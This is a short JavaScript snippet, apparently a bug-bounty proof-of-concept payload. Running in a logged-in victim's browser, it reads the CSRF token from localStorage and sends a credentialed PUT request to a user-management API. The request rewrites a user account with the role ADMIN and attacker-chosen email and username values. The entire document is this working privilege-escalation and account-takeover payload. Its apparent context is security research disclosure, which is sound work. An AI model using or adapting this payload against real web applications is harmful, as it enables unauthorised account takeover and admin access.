(()=>{
    const csrf = localStorage.getItem('csrfToken');
    
    fetch('/web/api2/v3/users/yD6g4rpcvcbp9JCazqrxk1', {
        method: 'PUT',
        credentials: 'include',
        headers: {
            'Content-Type': 'application/json',
            'X-Csrf-Token': csrf
        },
        body: JSON.stringify({
            firstName: "evil",
            lastName: "cathack",
            email: "aydilfhr+evil@intigriti.me",
            userName: "aydilfhr+evil",
            role: "ADMIN",
            timezone: "Europe/London",
            active: true,
            note: ""
        })
    })
    .then(r => r.text())
})();
